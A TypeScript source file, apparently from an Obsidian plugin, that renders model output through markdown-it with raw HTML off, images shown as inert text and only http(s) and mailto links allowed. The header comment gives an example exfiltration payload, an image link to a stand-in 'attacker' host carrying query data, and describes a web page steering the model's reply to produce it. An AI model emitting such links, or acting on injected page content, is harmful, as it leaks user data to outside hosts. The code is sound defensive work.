// SPDX-FileCopyrightText: 2026 Aneesh Mulye
// SPDX-License-Identifier: AGPL-3.0-or-later

/**
 * The only renderer for model output (INVARIANTS.md R1).
 *
 * Obsidian's MarkdownRenderer would load remote images and render raw HTML, so
 * a reply (perhaps written by a web page the model read) containing
 * `![](https://attacker/?q=…)` would leak data just by being displayed. This
 * renderer switches raw HTML off, shows images as plain text naming their URL,
 * and only links to http(s) and mailto URLs; anything else stays inert text.
 */

import MarkdownIt from 'markdown-it';

const SAFE_LINK = /^(https?:|mailto:)/i;

const md = new MarkdownIt({ html: false, linkify: true, breaks: true, typographer: false });
md.validateLink = (url: string): boolean => SAFE_LINK.test(url);

// Images are shown as inert text naming their URL, never as <img> (and not disguised as a link).
md.renderer.rules.image = (tokens, idx) => {
  const token = tokens[idx]!;
  const alt = token.content;
  const src = token.attrGet('src') ?? '';
  return md.utils.escapeHtml(`[image${alt ? `: ${alt}` : ''} — ${src}]`);
};

md.renderer.rules.link_open = (tokens, idx, options, _env, self) => {
  const token = tokens[idx]!;
  token.attrs = (token.attrs ?? []).filter(([name]) => name === 'href');
  token.attrSet('class', 'external-link');
  token.attrSet('target', '_blank');
  token.attrSet('rel', 'noopener noreferrer');
  return self.renderToken(tokens, idx, options);
};

/** Model Markdown to an HTML string that cannot load resources or run script. */
export function renderSafeMarkdown(text: string): string {
  return md.render(text);
}
